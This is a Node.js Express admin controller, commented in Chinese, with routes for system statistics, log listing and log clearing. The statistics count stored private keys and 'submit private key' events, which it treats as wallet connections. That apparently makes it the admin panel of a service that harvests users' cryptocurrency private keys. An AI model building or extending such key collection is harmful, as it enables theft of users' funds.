const User = require('../models/User');
const PrivateKey = require('../models/PrivateKey');
const Log = require('../models/Log');

// @desc    获取系统统计数据
// @route   GET /api/admin/stats
// @access  Private/Admin
const getStats = async (req, res) => {
  try {
    // 获取用户数量
    const userCount = await User.countDocuments();
    
    // 获取私钥数量
    const keyCount = await PrivateKey.countDocuments();
    
    // 获取今日登录数量
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const todayLoginCount = await Log.countDocuments({
      action: '用户登录',
      timestamp: { $gte: today }
    });
    
    // 获取钱包连接数量
    const walletCount = await Log.countDocuments({
      action: '提交私钥'
    });
    
    res.json({
      success: true,
      stats: {
        userCount,
        keyCount,
        todayLoginCount,
        walletCount
      }
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: '服务器错误' });
  }
};

// @desc    获取系统日志
// @route   GET /api/admin/logs
// @access  Private/Admin
const getLogs = async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 100;
    const logs = await Log.find({})
      .sort({ timestamp: -1 })
      .limit(limit);
    
    res.json({ success: true, logs });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: '服务器错误' });
  }
};

// @desc    清空系统日志
// @route   DELETE /api/admin/logs/clear
// @access  Private/Admin
const clearLogs = async (req, res) => {
  try {
    await Log.deleteMany({});
    
    // 记录清空日志的操作
    await Log.create({
      type: '管理员',
      username: req.user.username,
      action: '清空系统日志',
      ip: req.ip
    });
    
    res.json({ success: true, message: '系统日志已清空' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: '服务器错误' });
  }
};

module.exports = {
  getStats,
  getLogs,
  clearLogs
};